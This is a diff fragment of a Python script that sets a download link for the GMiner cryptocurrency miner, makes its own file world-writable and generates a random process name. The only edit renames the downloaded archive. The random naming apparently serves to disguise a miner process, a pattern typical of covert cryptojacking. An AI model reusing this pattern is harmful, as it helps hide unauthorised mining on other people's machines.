@@ -11,7 +11,7 @@ useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = ''
 link_github = 'https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz'
-link_folder = 'giautoidi.xz'
+link_folder = 'giautoidi.tar.xz'
 for k in range(1, 8, 1):
     program += random.choice(string.ascii_lowercase)
 os.system('pkill ' + program)
